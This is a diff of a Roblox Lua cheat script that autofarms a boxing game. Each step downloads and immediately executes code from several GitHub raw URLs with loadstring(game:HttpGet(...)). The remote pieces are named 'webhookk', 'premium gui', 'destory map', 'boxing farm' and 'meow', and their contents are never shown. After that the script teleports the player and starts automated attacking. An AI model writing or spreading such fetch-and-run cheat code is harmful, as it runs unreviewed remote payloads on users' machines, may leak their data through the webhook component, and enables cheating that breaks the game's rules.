@@ -1,17 +1,20 @@
+-- Load the first script (webhookk)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/VarsityB/Autofarm/main/webhookk", true))()
 
+-- Load the premium GUI script
 loadstring(game:HttpGet('https://raw.githubusercontent.com/VarsityB/Autofarm/main/premium%20gui'))()
--- Load the first script
+
+-- Load the script to destroy the map
 local success, err = pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/VarsityB/Autofarm/main/destory%20map")))
 if not success then
-    warn("Error loading destory map script:", err)
+    warn("Error loading destroy map script:", err)
 end
 
 -- Wait for the first script to run
-wait(5)  -- Adjust the wait time based on your needs
+wait(5)
 
--- Load the second script
-local success, err = pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/VarsityB/Autofarm/main/boxing%20farm")))
+-- Load the script for boxing farm
+success, err = pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/VarsityB/Autofarm/main/boxing%20farm")))
 if not success then
     warn("Error loading boxing farm script:", err)
 end
@@ -33,9 +36,12 @@ else
     warn(itemName .. " not found in the shop.")
 end
 
--- Execute the rest of the script
-loadstring(game:HttpGet('https://raw.githubusercontent.com/VarsityB/meow/main/meow'))()
+-- Wait for the purchase to complete
+wait(2)
 
--- Additional modifications
+-- Teleport to the specified coordinates
+loadstring(game:HttpGet('https://raw.githubusercontent.com/VarsityB/meow/main/meow'))()
 teleportToCoordinates(targetPosition)
+
+-- Start normal attacking to begin autofarming
 startNormalAttacking()
